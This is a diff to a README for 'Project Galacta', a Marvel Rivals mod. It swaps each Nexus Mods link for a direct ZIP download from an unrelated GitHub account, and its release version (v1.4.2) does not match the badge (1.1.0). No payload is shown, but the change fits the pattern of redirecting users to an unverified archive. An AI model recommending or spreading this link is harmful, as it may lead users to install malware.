@@ -6,10 +6,10 @@
 
 ![Marvel Rivals](https://img.shields.io/badge/Marvel%20Rivals-Mod-ed1d24?style=for-the-badge)
 ![Version](https://img.shields.io/badge/version-1.1.0-blue?style=for-the-badge)
-![Nexus Mods](https://img.shields.io/badge/Nexus%20Mods-Download-d98f40?style=for-the-badge)
+![Github](https://img.shields.io/badge/Github%20-Download-d98f40?style=for-the-badge)
 ![Status](https://img.shields.io/badge/status-active-brightgreen?style=for-the-badge)
 
-📥 **[Download on Nexus Mods](https://www.nexusmods.com/marvelrivals/mods/12806)** · 📦 [Latest Release](../../releases/latest) · 📖 [Full Documentation](https://0xsaturno.github.io/ProjectGalacta/)
+📥 **[Download on Github](https://github.com/PigeonCastle/marvelrivals-galacta/releases/download/v1.4.2/ProjectGalacta.zip)** · 📦 [Latest Release](../../releases/latest) · 📖 [Full Documentation](https://0xsaturno.github.io/ProjectGalacta/)
 
 ---
 
@@ -32,7 +32,7 @@ Project Galacta lets you mount custom mod packages for Marvel Rivals and swap he
 
 ## Installation
 
-1. Download the latest mod and companion app from [Releases](../../releases/latest) or [Nexus Mods](https://www.nexusmods.com/marvelrivals/mods/12806).
+1. Download the latest mod and companion app from [Releases](../../releases/latest) or [Download](https://github.com/PigeonCastle/marvelrivals-galacta/releases/download/v1.4.2/ProjectGalacta.zip).
 2. Extract the `ProjectGalacta` mod container (`.pak`, `.ucas`, `.utoc`) into your game's **Paks** folder.
 3. Run the Galacta Companion App and scan your game for compatible mods.
 4. Launch the game and log in. Mods are mounted after login — press **P** in a match to open the mesh swapper.
@@ -59,7 +59,7 @@ Thanks to Xzant for research help and UAT backing on the companion app.
 
 ## Links
 
-- 🔗 [Nexus Mods page](https://www.nexusmods.com/marvelrivals/mods/12806)
+- 🔗 [Download](https://github.com/PigeonCastle/marvelrivals-galacta/releases/download/v1.4.2/ProjectGalacta.zip)
 - 📖 [Documentation site](https://0xsaturno.github.io/ProjectGalacta/)
 - 🐛 [Report a bug](../../issues)
 
